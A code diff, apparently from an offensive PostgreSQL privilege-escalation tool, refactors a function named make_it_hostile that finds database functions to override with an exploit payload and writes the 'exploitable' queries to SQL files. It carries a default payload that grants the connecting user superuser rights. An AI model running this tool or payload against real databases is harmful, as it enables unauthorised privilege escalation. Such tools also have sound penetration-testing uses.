@@ -20,12 +20,10 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
     print_ok("Starting ... \n")
     c_functions = get_candidate_functions(db)
     print("[ * ] %s interesting functions have been identified" % len(c_functions))
-    # @TODO
-    print("[ * ] Detecting operators")
-    for cc in c_functions:
-        cc.get_operator()
 
+    print("[ * ] Detecting operators")
     for df in c_functions:
+        df.get_operator()
         conv_types = convert_types(df.params_type)
         for artype in conv_types:
             dff = DBFunctionOverride(df, artype, exploit_payload, stealth_mode, track_execution)
@@ -58,9 +56,9 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
                 pass
 
         with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
-            f.write("\n".join([f"{f};" for f in tested_queries]))
+            f.write("\n".join([f"{tq};" for tq in tested_queries]))
         with open(os.path.join(out_dir, "exploitables_operator.sql"), "w") as f:
-            f.write("\n".join([f"{f};" for f in tested_queries_operator]))
+            f.write("\n".join([f"{tq};" for tq in tested_queries_operator]))
 
         if len(exploitables) > 0:
             print("[ * ] %s exploitable functions found" % len(exploitables))
@@ -132,10 +130,6 @@ def main():
     if not db_pass or args.ask_pass:
         db_pass = getpass.getpass(prompt="Enter DB password:")
 
-    # if args.skip_tests and args.disable_exploits_creation:
-    #     print_err("Error: using both -X and -T won't produce any output... exiting")
-    #     return 2
-
     try:
         db = Database(
             username=args.db_username,
@@ -167,7 +161,6 @@ def main():
 
     exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"
 
-    # db.query("set search_path to '$user',postgres")  # @TODO search all superusers SELECT * FROM pg_roles where rolsuper;
     try:
         make_it_hostile(
             db,
